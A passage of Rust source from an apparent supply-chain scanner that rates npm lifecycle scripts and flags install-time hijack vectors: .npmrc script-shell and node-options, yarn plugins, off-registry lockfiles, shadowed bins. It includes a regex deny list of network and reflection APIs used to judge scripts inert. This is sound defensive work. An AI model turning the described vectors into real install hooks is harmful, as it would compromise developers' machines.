    /// (The package's own directory is [`Self::install_side_channel`].)
    fn ancestor_node_modules(&self, dir: &str) -> bool {
        let mut d = dir;
        while !d.is_empty() {
            d = split_rel(d).0;
            let nm = join_rel(d, "node_modules");
            if self.base.join(&nm).exists()
                || self
                    .present
                    .iter()
                    .any(|p| p.starts_with(&format!("{nm}/")))
            {
                return true;
            }
        }
        false
    }

    /// An in-tree package-manager config file, in `dir` or any directory
    /// above it, that can change what an install runs or where it fetches a
    /// package from — before a single script line changes. npm, yarn and pnpm
    /// read these from the install directory upward, so a package that ships
    /// one (or that is cloned or installed as a git dependency, where its own
    /// directory is the project root) runs with it in effect:
    ///
    /// - `.pnpmfile.cjs` is a JavaScript hook pnpm executes during resolution;
    /// - `.npmrc` can set `script-shell` / `shell` (the program that runs every
    ///   lifecycle script), `node-options` (`--require` preloads a module into
    ///   every `node`), `globalconfig` / `userconfig` (another config file that
    ///   can set those), or a `registry` off the public registry (the trusted
    ///   tool, or `only-allow`, then comes from an attacker host);
    /// - `.yarnrc` / `.yarnrc.yml` can set `yarn-path` / `yarnPath` (the JS run
    ///   as yarn), `plugins` (JS loaded into yarn), or an off-registry
    ///   `npmRegistryServer`.
    ///
    /// Any of these keeps the finding at its original severity. A `.npmrc` /
    /// `.yarnrc` with only benign keys does not.
    fn install_config_side_channel(&self, dir: &str) -> bool {
        // npm/yarn/pnpm read these whether or not the scan enumerated them, so
        // consult the filesystem directly rather than the scanned-file set. A
        // config file that exists but cannot be read as text counts against
        // the rewrite.
        let alters =
            |rel: &str, test: fn(&str) -> bool| match read_install_file(&self.base.join(rel)) {
                None => false,
                Some(Err(())) => true,
                Some(Ok(text)) => test(&text),
            };
        let mut d = dir;
        loop {
            if self.base.join(join_rel(d, ".pnpmfile.cjs")).exists() {
                return true;
            }
            if alters(&join_rel(d, ".npmrc"), npmrc_alters_install)
                || alters(&join_rel(d, ".yarnrc"), yarnrc_alters_install)
                || alters(&join_rel(d, ".yarnrc.yml"), yarnrc_yml_alters_install)
            {
                return true;
            }
            if d.is_empty() {
                return false;
            }
            d = split_rel(d).0;
        }
    }

    /// A lockfile beside the manifest that resolves `pkg` somewhere other
    /// than the public registry.
    fn lockfile_redirects(&self, dir: &str, pkg: &str) -> bool {
        let under = |name: &str| {
            if dir.is_empty() {
                name.to_string()
            } else {
                format!("{dir}/{name}")
            }
        };
        for name in ["package-lock.json", "npm-shrinkwrap.json"] {
            let Some(text) = self.read(&under(name)) else {
                continue;
            };
            let Ok(doc) = serde_json::from_str::<Value>(&text) else {
                return true;
            };
            let entries = [
                doc.get("packages")
                    .and_then(|p| p.get(format!("node_modules/{pkg}"))),
                doc.get("dependencies").and_then(|d| d.get(pkg)),
            ];
            for entry in entries.into_iter().flatten() {
                if let Some(resolved) = entry.get("resolved").and_then(Value::as_str) {
                    if !is_registry_tarball(resolved) {
                        return true;
                    }
                }
                if let Some(version) = entry.get("version").and_then(Value::as_str) {
                    if version.contains(':') || version.contains('/') {
                        return true;
                    }
                }
            }
        }
        for name in ["yarn.lock", "pnpm-lock.yaml"] {
            let Some(text) = self.read(&under(name)) else {
                continue;
            };
            // Text formats: any line naming the package that also carries a
            // URL off the public registry.
            if text.lines().any(|l| {
                l.contains(pkg)
                    && (l.contains("://") || l.contains("git") || l.contains("file:"))
                    && !is_registry_tarball_line(l)
            }) {
                return true;
            }
        }
        false
    }

    /// Codex review of #172, finding B, failing closed: whether anything in
    /// the install's scope can replace or add a package anywhere in the
    /// dependency tree, including *below* a trusted tool. The tool's own
    /// dependencies are installed and hoisted too (rimraf's, typescript's),
    /// so an override of one of them, a package extension that adds one, or
    /// a lockfile entry that fetches one from elsewhere can link a bin under a
    /// trusted name — `rimraf`, `tsc`, `node` — that runs in the tool's place.
    /// [`overrides_in`] and [`Self::lockfile_redirects`] only ask this about
    /// the tool's own name. `true` (no rewrite) when:
    ///
    /// - a manifest in the scope, or a `package.json` in any directory above
    ///   the package, declares a resolution change
    ///   ([`declares_resolution_changes`]) or cannot be parsed; or
    /// - a directory in the scope or above the package holds a
    ///   `pnpm-workspace.yaml`, lockfile or bun lockfile that
    ///   [`Self::dir_alters_resolution`] rejects.
    fn resolution_side_channel(&self, m: &Manifest, scope: &Scope) -> bool {
        if scope
            .manifests
            .iter()
            .any(|(_, doc)| declares_resolution_changes(doc))
        {
            return true;
        }
        let mut dirs: Vec<String> = scope.manifests.iter().map(|(d, _)| d.clone()).collect();
        let mut d = m.dir.as_str();
        while !d.is_empty() {
            d = split_rel(d).0;
            dirs.push(d.to_string());
            // A manifest above the package that is not already in the scope
            // (a non-workspace parent project) can still hold the root
            // `overrides` of an install run from there.
            let path = self.base.join(join_rel(d, "package.json"));
            match read_install_file(&path) {
                None => {}
                Some(Err(())) => return true,
                Some(Ok(text)) => match serde_json::from_str::<Value>(&text) {
                    Ok(doc) if doc.is_object() => {
                        if declares_resolution_changes(&doc) {
                            return true;
                        }
                    }
                    _ => return true,
                },
            }
        }
        dirs.sort();
        dirs.dedup();
        dirs.iter().any(|dir| self.dir_alters_resolution(dir))
    }

    /// Whether `dir` holds a `pnpm-workspace.yaml` that changes resolution
    /// ([`pnpm_workspace_alters_install`]), or a lockfile with an entry off
    /// the public registry or that cannot be parsed
    /// ([`npm_lock_off_registry`], [`yarn_lock_off_registry`],
    /// [`pnpm_lock_off_registry`]). A bun lockfile (`bun.lock`, the binary
    /// `bun.lockb`) is not read and always counts. Files are read from disk,
    /// not the scanned set: the package manager reads them whether or not
    /// the scan did, and one [`read_install_file`] cannot read counts as
    /// unparseable.
    fn dir_alters_resolution(&self, dir: &str) -> bool {
        if let Some(hit) = self.resolution.borrow().get(dir) {
            return *hit;
        }
        let read = |name: &str| read_install_file(&self.base.join(join_rel(dir, name)));
        type Check = fn(&str) -> bool;
        let checks: [(&str, Check); 5] = [
            ("pnpm-workspace.yaml", pnpm_workspace_alters_install),
            ("package-lock.json", npm_lock_off_registry),
            ("npm-shrinkwrap.json", npm_lock_off_registry),
            ("yarn.lock", yarn_lock_off_registry),
            ("pnpm-lock.yaml", pnpm_lock_off_registry),
        ];
        let hit = ["bun.lock", "bun.lockb"]
            .iter()
            .any(|n| self.base.join(join_rel(dir, n)).exists())
            || checks.iter().any(|(name, off)| match read(name) {
                None => false,
                Some(Err(())) => true,
                Some(Ok(text)) => off(&text),
            });
        self.resolution.borrow_mut().insert(dir.to_string(), hit);
        hit
    }
}

/// A package-manager file read straight from disk (a lockfile,
/// `pnpm-workspace.yaml`, `.npmrc`, a parent `package.json`): `None` when
/// nothing is at `path`; `Err` when something is there but is not a regular
/// file (a FIFO or a link to a device would block the read), is larger than
/// [`MAX_RESOLUTION_FILE_BYTES`] or is not UTF-8 — the callers count that
/// against the rewrite.
fn read_install_file(path: &Path) -> Option<Result<String, ()>> {
    if std::fs::symlink_metadata(path).is_err() {
        return None;
    }
    let Ok(meta) = std::fs::metadata(path) else {
        // A dangling link: npm would fail to read it; count it.
        return Some(Err(()));
    };
    if !meta.is_file() || meta.len() > MAX_RESOLUTION_FILE_BYTES {
        return Some(Err(()));
    }
    Some(std::fs::read_to_string(path).map_err(|_| ()))
}

fn is_registry_tarball(url: &str) -> bool {
    url.starts_with("https://registry.npmjs.org/")
        || url.starts_with("https://registry.yarnpkg.com/")
}

/// A registry URL value that points at the public npm/yarn registry.
fn is_public_registry(value: &str) -> bool {
    let v = value.trim().trim_matches(['"', '\'']);
    let host = v
        .strip_prefix("https://")
        .or_else(|| v.strip_prefix("http://"))
        .unwrap_or(v);
    host == "registry.npmjs.org"
        || host == "registry.yarnpkg.com"
        || host.starts_with("registry.npmjs.org/")
        || host.starts_with("registry.yarnpkg.com/")
}

/// A `.npmrc` that changes the program a lifecycle script runs under, preloads
/// code into `node`, points npm at another config file, or fetches packages
/// off the public registry. Comments (`#`, `;`) and benign keys are ignored.
fn npmrc_alters_install(text: &str) -> bool {
    for raw in text.lines() {
        let line = raw.split(['#', ';']).next().unwrap_or("").trim();
        let Some((key, value)) = line.split_once('=') else {
            continue;
        };
        let key = key.trim().to_ascii_lowercase();
        let value = value.trim();
        if matches!(
            key.as_str(),
            "script-shell" | "shell" | "node-options" | "globalconfig" | "userconfig"
        ) {
            return true;
        }
        if (key == "registry" || key.ends_with(":registry")) && !is_public_registry(value) {
            return true;
        }
    }
    false
}

/// A classic `.yarnrc` that points yarn at a different binary or fetches off
/// the public registry.
fn yarnrc_alters_install(text: &str) -> bool {
    for raw in text.lines() {
        let line = raw.split('#').next().unwrap_or("").trim();
        let mut tokens = line.splitn(2, char::is_whitespace);
        let key = tokens.next().unwrap_or("").trim();
        let value = tokens.next().unwrap_or("").trim();
        if matches!(key, "yarn-path" | "script-shell") {
            return true;
        }
        if key == "registry" && !is_public_registry(value) {
            return true;
        }
    }
    false
}

/// A `.yarnrc.yml` (Yarn Berry) that runs a different binary as yarn, loads a
/// plugin, or fetches off the public registry.
fn yarnrc_yml_alters_install(text: &str) -> bool {
    for raw in text.lines() {
        let line = raw.split('#').next().unwrap_or("");
        // A top-level key (no leading indentation) followed by `:`.
        if line.starts_with([' ', '\t']) {
            // A `plugins:` block lists its entries indented beneath it; a
            // `- path:` line inside it still names a plugin to load.
            if line.trim_start().starts_with("- path:") || line.trim_start().starts_with("path:") {
                return true;
            }
            continue;
        }
        let Some((key, value)) = line.split_once(':') else {
            continue;
        };
        let key = key.trim();
        let value = value.trim();
        // `packageExtensions` adds dependencies to a dependency's manifest,
        // as pnpm's does (see `declares_resolution_changes`).
        if matches!(key, "yarnPath" | "plugins" | "packageExtensions") {
            return true;
        }
        if key == "npmRegistryServer" && !value.is_empty() && !is_public_registry(value) {
            return true;
        }
    }
    false
}

fn is_registry_tarball_line(line: &str) -> bool {
    let urls: Vec<&str> = line
        .split(|c: char| c.is_whitespace() || matches!(c, '"' | '\'' | ','))
        .filter(|t| t.contains("://"))
        .collect();
    !urls.is_empty()
        && urls
            .iter()
            .all(|u| is_registry_tarball(u.trim_start_matches("resolved")))
}

// ---------------------------------------------------------------------------
// Entry point
// ---------------------------------------------------------------------------

/// Rewrite the lifecycle and launcher findings whose command provably cannot
/// act on the installing machine (see the module docs). Called by
/// `run_scan` after the content phases, before install-time linking.
pub fn classify_lifecycle(base: &Path, files: &[PathBuf], findings: &mut [Finding]) {
    let relevant = |f: &Finding| {
        matches!(f.rule.as_str(), "INSTALL-003" | "INSTALL-004" | "CODE-014")
            && f.locator.is_none()
            && !f.snippet.starts_with('[')
    };
    if !findings.iter().any(relevant) {
        return;
    }
    let mut tree = Tree::new(base, files);
    for f in findings.iter_mut().filter(|f| relevant(f)) {
        let Some(line_no) = f.line else {
            continue;
        };
        let file = f.file.replace('\\', "/");
        let outcome = match f.rule.as_str() {
            "INSTALL-003" | "INSTALL-004" if split_rel(&file).1 == "package.json" => {
                classify_manifest_line(&mut tree, &file, &f.rule, line_no)
            }
            "CODE-014" => classify_launcher_line(&mut tree, &file, line_no),
            _ => None,
        };
        if let Some(r) = outcome {
            f.rule = r.rule.to_string();
            f.severity = r.severity;
            f.snippet = format!("{}: {} ({})", r.title, truncate(r.line.trim()), r.reason);
        }
    }
}

struct Rewrite {
    rule: &'static str,
    severity: Severity,
    title: &'static str,
    line: String,
    reason: String,
}

fn truncate(line: &str) -> String {
    const LIMIT: usize = 200;
    if line.len() <= LIMIT {
        return line.to_string();
    }
    let mut end = LIMIT;
    while !line.is_char_boundary(end) {
        end -= 1;
    }
    format!("{} ...", &line[..end])
}

// ---------------------------------------------------------------------------
// INSTALL-003 / INSTALL-004 on a manifest line
// ---------------------------------------------------------------------------

/// Every lifecycle key the rule matches on this manifest line must be a
/// top-level script that classifies; the rewrite takes the most severe class.
fn classify_manifest_line(
    tree: &mut Tree<'_>,
    rel: &str,
    rule: &str,
    line_no: usize,
) -> Option<Rewrite> {
    tree.load_manifest(rel);
    let tree: &Tree<'_> = tree;
    let m = tree.manifest(rel)?;
    let line = m.line(line_no)?.to_string();
    let key_re = if rule == "INSTALL-003" {
        re!(r#""(preinstall|postinstall|preuninstall|postuninstall)""#)
    } else {
        re!(r#""(prepare|prepublish)"\s*:"#)
    };
    let keys: Vec<String> = key_re
        .captures_iter(&line)
        .map(|c| c[1].to_string())
        .collect();
    if keys.is_empty() {
        return None;
    }
    if tree.install_side_channel(&m.dir)
        || tree.ancestor_node_modules(&m.dir)
        || tree.install_config_side_channel(&m.dir)
    {
        return None;
    }
    let scope = tree.scope(m)?;
    // Every rewrite below trusts what a name resolves to; an override,
    // package extension or off-registry lockfile entry anywhere in the tree
    // can change that below the tool itself.
    if tree.resolution_side_channel(m, &scope) {
        return None;
    }
    let phase = if rule == "INSTALL-003" {
        InstallPhase::Install
    } else {
        InstallPhase::Prepare
    };
    let mut reasons = Vec::new();
    let mut worst: Option<(&'static str, Severity, &'static str)> = None;
    for key in &keys {
        let cmd = m.script(key)?;
        let class = if rule == "INSTALL-003" {
            if let Some(reason) = guard(cmd, m, &scope, phase) {
                reasons.push(format!("{key}: {reason}"));
                (RULE_GUARD, Severity::Low, TITLE_GUARD)
            } else {
                let reason = inert_node(cmd, m, tree, &scope, phase)?;
                reasons.push(format!("{key}: {reason}"));
                (RULE_INERT, Severity::Medium, TITLE_INERT)
            }
        } else {
            let reason = build_only(key, m, tree, &scope, phase)?;
            reasons.push(format!("{key}: {reason}"));
            (RULE_BUILD, Severity::Low, TITLE_BUILD)
        };
        if worst.is_none_or(|w| class.1 > w.1) {
            worst = Some(class);
        }
    }
    let (rule, severity, title) = worst?;
    Some(Rewrite {
        rule,
        severity,
        title,
        line,
        reason: reasons.join("; "),
    })
}

// ---------------------------------------------------------------------------
// INSTALL-011: npx only-allow
// ---------------------------------------------------------------------------

fn guard(cmd: &str, m: &Manifest, scope: &Scope, phase: InstallPhase) -> Option<String> {
    let caps = re!(r"^npx (?:-y |--yes )?only-allow (pnpm|yarn|npm|bun)$").captures(cmd)?;
    if !m.declared_specs("only-allow").is_empty()
        || m.bundles("only-allow")
        || m.overrides("only-allow")
        // `npx only-allow` runs the `npx` and `only-allow` bins from
        // node_modules/.bin first, and both are `#!/usr/bin/env node`
        // scripts, so `node` resolves there too; a shipped bin of any of
        // those names shadows them.
        || scope.shadows(["npx", "only-allow", "node"])
        // Any package the install adds could link one of those names: only
        // an install that adds none rules that out.
        || !scope.installs_only(phase, &[])
    {
        return None;
    }
    Some(format!(
        "only checks that the installer is {}; only-allow is fetched from the registry",
        &caps[1]
    ))
}

// ---------------------------------------------------------------------------
// INSTALL-010: node <inert local script>
// ---------------------------------------------------------------------------

fn inert_node(
    cmd: &str,
    m: &Manifest,
    tree: &Tree<'_>,
    scope: &Scope,
    phase: InstallPhase,
) -> Option<String> {
    let caps =
        re!(r"^node (?:\./)?([A-Za-z0-9_][A-Za-z0-9_./-]*\.(?:js|cjs|mjs))$").captures(cmd)?;
    let rel = &caps[1];
    if !is_package_relative_path(rel) {
        return None;
    }
    // `node` itself resolves through node_modules/.bin first: a `node` bin
    // the package, a workspace member or any package the install adds links
    // there runs in place of the interpreter, so the target is not what runs.
    // (The `node` package on npm is one such dependency.)
    if scope.shadows(["node"]) || !scope.installs_only(phase, &[]) {
        return None;
    }
    let target = resolve_under(&m.dir, &m.dir, rel)?;
    let mut seen: HashSet<String> = HashSet::new();
    let mut queue: Vec<(String, usize)> = vec![(target, 0)];
    let mut builtins: Vec<&'static str> = Vec::new();
    while let Some((file, depth)) = queue.pop() {
        if !seen.insert(file.clone()) {
            continue;
        }
        let text = tree.read(&file)?;
        let specs = inert_source(&text).ok()?;
        let file_dir = split_rel(&file).0;
        for spec in specs {
            match spec {
                Spec::Builtin(name) => builtins.push(name),
                Spec::Json(p) => {
                    resolve_under(&m.dir, file_dir, &p)?;
                }
                Spec::Js(p) => {
                    if depth + 1 > MAX_INERT_DEPTH {
                        return None;
                    }
                    let next = resolve_under(&m.dir, file_dir, &p)?;
                    if !tree.present.contains(&next) {
                        return None;
                    }
                    queue.push((next, depth + 1));
                }
            }
        }
    }
    builtins.sort_unstable();
    builtins.dedup();
    Some(format!(
        "{} script(s) checked; no capability beyond {}",
        seen.len(),
        if builtins.is_empty() {
            "console output".to_string()
        } else {
            format!("the {} module(s)", builtins.join(", "))
        }
    ))
}

/// What a `require` / `import` in an inert script may name.
#[derive(Debug, PartialEq, Eq)]
pub(crate) enum Spec {
    /// `os`, `path`, `url` or `util`, with or without `node:`.
    Builtin(&'static str),
    /// A relative `.json` file (read as data).
    Json(String),
    /// A relative `.js` / `.cjs` / `.mjs` file, checked in turn.
    Js(String),
}

fn classify_spec(spec: &str) -> Option<Spec> {
    let bare = spec.strip_prefix("node:").unwrap_or(spec);
    for name in ["os", "path", "url", "util"] {
        if bare == name {
            return Some(Spec::Builtin(name));
        }
    }
    if !(spec.starts_with("./") || spec.starts_with("../")) || !is_package_relative_path_or_up(spec)
    {
        return None;
    }
    if spec.ends_with(".json") {
        Some(Spec::Json(spec.to_string()))
    } else if [".js", ".cjs", ".mjs"].iter().any(|e| spec.ends_with(e)) {
        Some(Spec::Js(spec.to_string()))
    } else {
        None
    }
}

/// A relative module specifier: package-relative characters, `..` allowed
/// (the resolver checks it stays inside the package).
fn is_package_relative_path_or_up(p: &str) -> bool {
    p.bytes()
        .all(|b| b.is_ascii_alphanumeric() || matches!(b, b'_' | b'.' | b'/' | b'-' | b'@'))
        && !p.contains("//")
}

const OS_MEMBERS: &[&str] = &["platform", "arch", "type", "release", "EOL"];

/// The positive test for a script a lifecycle key runs with `node`: `Ok`
/// with the module specifiers it loads only when it demonstrably has no way
/// to reach the network, the filesystem, child processes, the environment or
/// the code-generation primitives.
///
/// It is deliberately a whitelist over plain text rather than a parse: a
/// short, ASCII, unminified file; `require` / `import` only of `os`, `path`,
/// `url`, `util`, relative JSON or relative scripts (checked the same way);
/// `process` only for exit, argv, platform, arch, version, stdout, stderr
/// and cwd, and `os` only for platform, arch, type, release and EOL; no
/// computed member access (the way around every name check); none of the
/// globals and reflection APIs that reach the rest (eval, Function,
/// constructor, Reflect, globalThis, this, arguments, fetch, Buffer, ...);
/// no escapes that spell a name without writing it; no IP literal; and no
/// URL outside a `console.*` call. Anything else fails, which only means the
/// finding keeps its Critical severity.
pub(crate) fn inert_source(text: &str) -> Result<Vec<Spec>, &'static str> {
    if text.len() > MAX_INERT_BYTES {
        return Err("larger than 4 KiB");
    }
    if !text
        .bytes()
        .all(|b| matches!(b, b'\t' | b'\n' | b'\r' | 0x20..=0x7e))
    {
        return Err("not printable ASCII");
    }
    if text.lines().any(|l| l.len() > MAX_INERT_LINE) {
        return Err("a line longer than 200 bytes");
    }
    if re!(concat!(
        r"\b(?:global|globalThis|this|self|arguments|eval|Function|constructor|__proto__|prototype",
        r"|fetch|XMLHttpRequest|WebSocket|EventSource|Buffer|atob|fromCharCode|Reflect|Proxy",
        r"|getOwnPropertyDescriptors?|getPrototypeOf|setPrototypeOf|defineProperty|defineProperties",
        r"|__defineGetter__|__defineSetter__|__lookupGetter__|__lookupSetter__|WebAssembly|Worker",
        r"|createRequire|dlopen|binding|mainModule|prepareStackTrace|getFunction|getThis|callee|caller)\b"
    ))
    .is_match(text)
    {
        return Err("a forbidden global or reflection API");
    }
    if re!(r"\\[xu0-9]").is_match(text) {
        return Err("an escape sequence");
    }
    if re!(r"\bimport\s*\(|\bwith\s*\(").is_match(text) {
        return Err("dynamic import or with()");
    }
    for m in re!(r#"[\w$)\]'"`.?]\s*\["#).find_iter(text) {
        if !re!(r"^\s*\d+\s*\]").is_match(&text[m.end()..]) {
            return Err("computed member access");
        }
    }
    if re!(r"\]\s*[:(]").is_match(text) {
        return Err("a computed key or call");
    }
    if re!(r"\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b").is_match(text) {
        return Err("an IPv4 literal");
    }
    for line in text.lines() {
        for (pos, _) in line.match_indices("://") {
            if !line[..pos].contains("console.") {
                return Err("a URL outside console output");
            }
        }
    }

    let mut specs = Vec::new();
    // require: only a literal specifier, or require.resolve.
    for m in re!(r"\brequire\b").find_iter(text) {
        let rest = &text[m.start()..];
        if re!(r"^require\s*\.\s*resolve\s*\(").is_match(rest) {
            continue;
        }
        let caps = re!(r#"^require\s*\(\s*(['"])([^'"\n\\]*)(['"])\s*\)"#)
            .captures(rest)
            .ok_or("require of something other than a literal")?;
        if caps[1] != caps[3] {
            return Err("mismatched quotes");
        }
        let spec = classify_spec(&caps[2]).ok_or("require of a module outside the allowlist")?;
        if spec == Spec::Builtin("os") {
            let before = &text[..m.start()];
            let after = &rest[caps[0].len()..];
            let bound = re!(r"\b(?:const|let|var)\s+os\s*=\s*$").is_match(before)
                || re!(r"^\s*\.\s*(?:platform|arch|type|release|EOL)\b").is_match(after)
                || re!(r"\b(?:const|let|var)\s*\{([^}]*)\}\s*=\s*$")
                    .captures(before)
                    .is_some_and(|c| names_allowed(&c[1]));
            if !bound {
                return Err("os bound to something other than `os`");
            }
        }
        specs.push(spec);
    }
    // import: static forms only, same allowlist.
    for m in re!(r"\bimport\b").find_iter(text) {
        let rest = &text[m.start()..];
        if re!(r"^import\s*\.\s*meta\b").is_match(rest) {
            continue;
        }
        if let Some(c) = re!(r#"^import\s+(['"])([^'"\n\\]+)(['"])"#).captures(rest) {
            if c[1] != c[3] {
                return Err("mismatched quotes");
            }
            specs.push(classify_spec(&c[2]).ok_or("import outside the allowlist")?);
            continue;
        }
        let c = re!(r#"^import\s+([^'";]*?)\s+from\s+(['"])([^'"\n\\]+)(['"])"#)
            .captures(rest)
            .ok_or("an import this check does not read")?;
        if c[2] != c[4] {
            return Err("mismatched quotes");
        }
        let spec = classify_spec(&c[3]).ok_or("import outside the allowlist")?;
        if spec == Spec::Builtin("os") {
            let clause = c[1].trim();
            let ok = clause == "os"
                || re!(r"^\*\s*as\s+os$").is_match(clause)
                || re!(r"^\{([^}]*)\}$")
                    .captures(clause)
                    .is_some_and(|c| names_allowed(&c[1]));
            if !ok {
                return Err("os imported under another name");
            }
        }
        specs.push(spec);
    }
    // `export ... from` re-exports.
    for c in re!(r#"\bfrom\s*(['"])([^'"\n\\]+)(['"])"#).captures_iter(text) {
        classify_spec(&c[2]).ok_or("re-export outside the allowlist")?;
    }
    // process: allowlisted members only.
    for m in re!(r"\bprocess\b").find_iter(text) {
        if !re!(r"^process\s*\.\s*(?:exit|exitCode|argv|platform|arch|version|versions|stdout|stderr|cwd)\b")
            .is_match(&text[m.start()..])
        {
            return Err("process used beyond exit/argv/platform/arch/version/stdout/stderr/cwd");
        }
    }
    // os: the specifier, the binding, or an allowlisted member.
    for m in re!(r"\bos\b").find_iter(text) {
        let before = &text[..m.start()];
        let after = &text[m.end()..];
        let specifier =
            (before.ends_with('\'') || before.ends_with('"') || before.ends_with("node:"))
                && (after.starts_with('\'') || after.starts_with('"'));
        let binding = re!(r"\b(?:const|let|var)\s+$").is_match(before)
            && re!(r#"^\s*=\s*require\s*\(\s*['"](?:node:)?os['"]\s*\)"#).is_match(after);
        let import = re!(r"(?:\bimport|\*\s*as)\s+$").is_match(before)
            && re!(r#"^\s+from\s+['"](?:node:)?os['"]"#).is_match(after);
        let member = re!(r"^\s*\.\s*(?:platform|arch|type|release|EOL)\b").is_match(after);
        if !(specifier || binding || import || member) {
            return Err("os used beyond platform/arch/type/release/EOL");
        }
    }
    Ok(specs)
}

/// A destructuring or named-import list whose source names are all
/// allowlisted `os` members (`{ platform, arch: a }`, `{ type as t }`).
fn names_allowed(list: &str) -> bool {
    list.split(',')
        .map(str::trim)
        .filter(|s| !s.is_empty())
        .all(|item| {
            let name = item
                .split(|c: char| c == ':' || c.is_whitespace())
                .next()
                .unwrap_or("");
            OS_MEMBERS.contains(&name)
        })
}

// ---------------------------------------------------------------------------
// INSTALL-012: build-only prepare / prepublish
// ---------------------------------------------------------------------------

fn build_only(
    key: &str,
    m: &Manifest,
    tree: &Tree<'_>,
    scope: &Scope,
    phase: InstallPhase,
) -> Option<String> {
    let scripts = m.scripts()?;
    let mut leaves = Vec::new();
    let mut runners: Vec<&'static str> = Vec::new();
    // npm runs pre<key> and post<key> around the lifecycle script.
    for name in [format!("pre{key}"), key.to_string(), format!("post{key}")] {
        if let Some(cmd) = scripts.get(&name) {
            run_leaves(cmd.as_str()?, scripts, 0, &mut leaves, &mut runners)?;
        }
    }
    let mut tools: Vec<&'static str> = Vec::new();
    let mut trusted: Vec<&str> = Vec::new();
    for leaf in &leaves {
        if let Some(tool) = build_leaf(leaf)? {
            tools.push(tool);
        }
        // The command actually run (the first token) resolves through
        // node_modules/.bin first — except the shell builtins `true` and
        // `exit`, which take precedence over any file on PATH. A shipped bin of
        // that name (a workspace member's `chmod`, or the package's own) runs
        // in its place, so the step is not the build tool it looks like.
        let cmd0 = leaf.split(' ').next().unwrap_or("");
        if !matches!(cmd0, "true" | "exit") {
            trusted.push(cmd0);
        }
    }
    // Finding 1 of the #172 review: the runner of every `npm|pnpm|yarn run X`
    // the chain followed is itself run by name, from the same PATH, so a bin
    // named `npm` runs in its place and the script it "runs" is never
    // reached. And every runner and tool package bin is a
    // `#!/usr/bin/env node` script, so `node` is trusted as well.
    trusted.extend(runners.iter().copied());
    if !tools.is_empty() || !runners.is_empty() {
        trusted.push("node");
    }
    if scope.shadows(trusted) {
        return None;
    }
    tools.sort_unstable();
    tools.dedup();
    // Finding 2: a bin with any of those names could come from any package
    // the prepare install adds, dependencies and devDependencies alike, and
    // this pass cannot see a dependency's bins. Only the tools' own packages
    // may be installed.
    if !scope.installs_only(phase, &tools) {
        return None;
    }
    for tool in &tools {
        // The tool must be a registry dependency the manifest pins itself. An
        // undeclared build-tool name (`prepare: "tsc"` with no `typescript`
        // dependency) is not a build step this classifier can trust: npm
        // prepends `node_modules/.bin` to PATH for lifecycle scripts, so a
        // dependency that ships a `tsc` / `husky` / `rimraf` / `shx` bin runs
        // in place of the real tool, and the package never had to name the
        // real one. Declared-but-redirected (git/tarball spec, bundled,
        // overridden, lockfile-redirected) is rejected the same way.
        let specs = m.declared_specs(tool);
        if specs.is_empty()
            || specs.iter().any(|s| !is_registry_spec(s))
            || m.bundles(tool)
            || m.overrides(tool)
            || tree.lockfile_redirects(&m.dir, tool)
        {
            return None;
        }
        // In a workspace the root's overrides and lockfile decide which
        // `typescript` is hoisted for a member too: hold every manifest in
        // the scope to the same test.
        if scope
            .manifests
            .iter()
            .any(|(dir, doc)| overrides_in(doc, tool) || tree.lockfile_redirects(dir, tool))
        {
            return None;
        }
    }
    let mut shown: Vec<&str> = leaves.iter().map(String::as_str).collect();
    shown.dedup();
    Some(format!("build steps only: {}", shown.join(", ")))
}

/// The leaf commands of `cmd`, following `npm|pnpm|yarn run X` into the
/// named script (and the `preX` / `postX` scripts npm runs around it) to
/// [`MAX_RUN_DEPTH`]. `None` for anything with shell syntax beyond `&&`,
/// `||` and `;`, or a run of a script that does not exist. Every runner a
/// followed step names (`npm`, `pnpm`, `yarn`) is added to `runners`: it is
/// run by name from the lifecycle PATH like any leaf, so the caller must
/// trust it too.
fn run_leaves(
    cmd: &str,
    scripts: &serde_json::Map<String, Value>,
    depth: usize,
    out: &mut Vec<String>,
    runners: &mut Vec<&'static str>,
) -> Option<()> {
    if cmd.chars().any(|c| {
        matches!(
            c,
            '`' | '$' | '>' | '<' | '\n' | '\r' | '(' | ')' | '"' | '\'' | '\\' | '#'
        )
    }) {
        return None;
    }
    let normalised = cmd.replace("&&", ";").replace("||", ";");
    if normalised.contains(['&', '|']) {
        return None;
    }
    for part in normalised.split(';') {
        let part = part.split_whitespace().collect::<Vec<_>>().join(" ");
        if part.is_empty() {
            continue;
        }
        if let Some(c) = re!(r"^(npm|pnpm|yarn) run ([A-Za-z0-9:._-]+)$").captures(&part) {
            if depth >= MAX_RUN_DEPTH {
                return None;
            }
            let runner = match &c[1] {
                "npm" => "npm",
                "pnpm" => "pnpm",
                _ => "yarn",
            };
            if !runners.contains(&runner) {
                runners.push(runner);
            }
            let name = &c[2];
            scripts.get(name)?;
            for s in [
                format!("pre{name}"),
                name.to_string(),
                format!("post{name}"),
            ] {
                if let Some(next) = scripts.get(&s) {
                    run_leaves(next.as_str()?, scripts, depth + 1, out, runners)?;
                }
            }
        } else {
            out.push(part);
        }
    }
    Some(())
}

/// `Some(Some(package))` for a build step run from that package's binary,
/// `Some(None)` for a shell builtin step, `None` for anything else.
fn build_leaf(leaf: &str) -> Option<Option<&'static str>> {
    let tokens: Vec<&str> = leaf.split(' ').collect();
    let rels =
        |ts: &[&str], min: usize| ts.len() >= min && ts.iter().all(|t| is_package_relative_path(t));
    match tokens.as_slice() {
        ["true"] | ["exit", "0"] => Some(None),
        ["tsc", rest @ ..] => {
            let mut i = 0;
            while i < rest.len() {
                let t = rest[i];
                let takes_config = matches!(t, "-p" | "--project" | "-b" | "--build");
                if !re!(r"^--?[A-Za-z][A-Za-z-]*$").is_match(t) {
                    return None;
                }
                if takes_config {
                    if let Some(next) = rest.get(i + 1) {
                        if !next.starts_with('-') {
                            if !(next.ends_with(".json") && is_package_relative_path(next)) {
                                return None;
                            }
                            i += 1;
                        }
                    } else if matches!(t, "-p" | "--project") {
                        return None;
                    }
                }
                i += 1;
            }
            Some(Some("typescript"))
        }
        ["husky"] | ["husky", "install"] => Some(Some("husky")),
        ["chmod", "+x", paths @ ..] if rels(paths, 1) => Some(None),
        ["shx", "chmod", "+x", paths @ ..] if rels(paths, 1) => Some(Some("shx")),
        ["shx", "mkdir", "-p", paths @ ..] if rels(paths, 1) => Some(Some("shx")),
        ["shx", "cp", "-r", paths @ ..] if rels(paths, 2) => Some(Some("shx")),
        ["shx", "cp", paths @ ..] if rels(paths, 2) => Some(Some("shx")),
        ["shx", "rm", "-rf", paths @ ..] if rels(paths, 1) => Some(Some("shx")),
